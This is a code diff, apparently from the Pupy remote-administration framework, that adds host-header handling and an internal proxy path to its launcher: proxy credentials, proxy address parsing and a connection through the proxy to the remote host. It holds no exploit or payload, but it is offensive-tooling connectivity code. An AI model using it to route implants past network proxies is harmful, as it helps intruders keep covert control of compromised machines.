@@ -55,6 +55,11 @@ class AutoProxyLauncher(BaseLauncher):
                     k:v for k,v in t.client_transport_kwargs.iteritems()
                 }
 
+                if 'host' in transport_args and not 'host' in opt_args:
+                    transport_args['host'] = '{}{}'.format(
+                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
+                    )
+
                 for val in opt_args:
                     if val.lower() in t.client_kwargs:
                         client_args[val.lower()]=opt_args[val]
@@ -62,6 +67,7 @@ class AutoProxyLauncher(BaseLauncher):
                         transport_args[val.lower()]=opt_args[val]
                     else:
                         logging.warning("unknown transport argument : %s"%val)
+
                 logging.info("using client options: %s"%client_args)
                 logging.info("using transports options: %s"%transport_args)
                 try:
@@ -99,11 +105,47 @@ class AutoProxyLauncher(BaseLauncher):
                     k:v for k,v in t.client_transport_kwargs.iteritems()
                 }
 
+                if 'host' in transport_args and not 'host' in opt_args:
+                    transport_args['host'] = '{}{}'.format(
+                        self.rhost, ':{}'.format(self.rport) if self.rport != 80 else ''
+                    )
+
                 for val in opt_args:
                     if val.lower() in t.client_transport_kwargs:
                         transport_args[val.lower()]=opt_args[val]
                     else:
                         client_args[val.lower()]=opt_args[val]
+
+                if proxy_type in t.internal_proxy_impl:
+                    transport_args['proxy'] = True
+
+                    if proxy_password or proxy_username:
+                        transport_args['auth'] = (proxy_username, proxy_password)
+
+                    host, port = proxy.split(':')
+                    port = int(port)
+
+                    logging.info("using internal proxy implementation with client options: %s"%client_args)
+                    logging.info("using transports options: %s"%transport_args)
+
+                    try:
+                        t.parse_args(transport_args)
+                    except Exception as e:
+                        raise SystemExit(e)
+
+                    try:
+                        client = t.client(**client_args)
+                    except Exception as e:
+                        raise SystemExit(e)
+
+                    logging.info("connecting to %s:%s using transport %s with internal proxy impl via %s:%d ..."%(
+                        self.rhost, self.rport, self.args.transport, host, port))
+
+                    s = client.connect(host, port)
+                    stream = t.stream(s, t.client_transport, transport_args)
+                    yield stream
+                    continue
+
                 if t.client is PupyTCPClient:
                     t.client=PupyProxifiedTCPClient
                 elif t.client is PupySSLClient:
